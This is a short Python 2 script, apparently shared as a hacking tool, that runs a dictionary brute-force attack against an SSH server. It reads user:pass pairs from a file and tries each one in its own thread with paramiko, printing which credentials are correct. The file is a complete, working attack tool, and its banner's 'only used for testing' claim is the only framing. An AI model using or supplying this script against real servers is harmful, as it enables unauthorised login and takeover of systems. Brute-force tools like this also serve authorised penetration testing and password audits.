#!/usr/bin/env python2
# Program: SSH Dictionary Attack v1
# Author: psibot
# Purpose: Brutforce SSH !!!
# SCRIPT ONLY WORKS PYTHON V2

import time
import os
from termcolor import colored, cprint
import sys
import socket
import paramiko
import threading

# Colours
W  = "\033[0m";
R  = "\033[31m";

# Banner
def logo():
  os.system('clear')
  cprint('--------------------------------------------------------------', 'green',attrs=['bold'])
  print colored('[+]', 'red'), colored('SSH BRUTEFORCE ATTACK : Linux Servers V1', 'red')
  print colored('[+]', 'red'), colored('....Find anything!.....', 'green')
  cprint('--------------------------------------------------------------', 'green',attrs=['bold'])
  print R+"\n|---------------------------------------------------------------|"
  print "    __________ __  ___  ___  __  ____________________  ___  _________  ___ _______________  _______ __"
  print "   / __/ __/ // / / _ )/ _ \/ / / /_  __/ __/ __/ __ \/ _ \/ ___/ __/ / _ /_  __/_  __/ _ |/ ___/ //_/"
  print"  _\ \_\ \/ _  / / _  / , _/ /_/ / / / / _// _// /_/ / , _/ /__/ _/  / __ |/ /   / / / __ / /__/ ,<  "
  print " /___/___/_//_/ /____/_/|_|\____/ /_/ /___/_/  \____/_/|_|\___/___/ /_/ |_/_/   /_/ /_/ |_\___/_/|_| " 
  print "                                                                                                    "
  print "|   d3am0n711[@]gmail[dot]com                                   |"
  print "|   THIS will be only used for testing                          |"
  print "|---------------------------------------------------------------|\n"
  print W

logo()

if len(sys.argv) < 3:
    print "Usage: %s IP /path/to/dictionary" % (str(sys.argv[0]))
    print "Example: %s 10.0.0.1 dict.txt" % (str(sys.argv[0]))
    print "Dictionary should be in user:pass format"
    sys.exit(1)

ip=sys.argv[1]; filename=sys.argv[2]

fd = open(filename, "r")

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print colored('[-]', 'blue'),' %s:%s fail!' % (UserName, Password)
    else:
        print colored('[!]', 'red'),' %s:%s is CORRECT!' % (UserName, Password)
    ssh.close()
    return

print '[+] Bruteforcing against %s with dictionary %s' % (ip, filename)
for line in fd.readlines():
    username, password = line.strip().split(":")
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    time.sleep(0.5)

fd.close()
sys.exit(0)
